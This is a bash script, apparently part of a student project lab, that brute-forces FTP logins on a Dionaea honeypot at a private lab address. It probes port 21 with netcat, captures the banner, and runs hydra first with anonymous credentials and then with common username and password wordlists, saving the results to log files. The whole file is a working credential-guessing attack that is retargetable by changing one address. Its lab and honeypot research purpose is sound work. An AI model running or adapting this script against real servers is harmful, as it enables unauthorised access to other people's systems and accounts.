#!/bin/bash
# FTP brute force - targets Dionaea

DIONAEA="172.16.0.30"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/brute_force"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS="/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt"

mkdir -p "$LOGDIR"

echo "FTP brute force on $DIONAEA"

if nc -zw2 "$DIONAEA" 21 2>/dev/null; then
    echo "QUIT" | nc -w 3 "$DIONAEA" 21 > "$LOGDIR/ftp_banner_${DIONAEA}.txt"
    hydra -l anonymous -p anonymous -t 4 -o "$LOGDIR/ftp_anon_${DIONAEA}.txt" ftp://$DIONAEA 2>/dev/null
    timeout 600 hydra -L "$USERS" -P "$PASS" -t 4 -o "$LOGDIR/ftp_${DIONAEA}.txt" ftp://$DIONAEA 2>/dev/null
else
    echo "FTP not open"
fi

echo "Done"
